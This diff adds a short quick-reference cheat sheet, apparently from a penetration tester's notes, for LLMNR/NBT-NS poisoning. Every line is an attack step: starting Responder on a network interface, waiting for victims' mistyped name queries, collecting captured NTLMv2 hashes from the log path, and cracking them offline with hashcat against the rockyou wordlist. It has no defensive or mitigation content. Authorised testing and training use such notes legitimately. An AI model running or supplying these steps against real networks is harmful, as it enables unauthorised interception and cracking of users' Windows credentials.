@@ -1,0 +1,7 @@
+LLMNR POISONING / RESPONDER - QUICK REF
+
+1.  sudo responder -I <interface>
+2.  Wait for victim to query a non-existent hostname (e.g. mistyped share)
+3.  Hash captured → /usr/share/responder/logs/SMB-NTLMv2-SSP-<victim-ip>.txt
+4.  hashcat -m 5600 <hash-file> /usr/share/wordlists/rockyou.txt --force
+5.  Ctrl+C to stop Responder (no ARP cleanup needed)
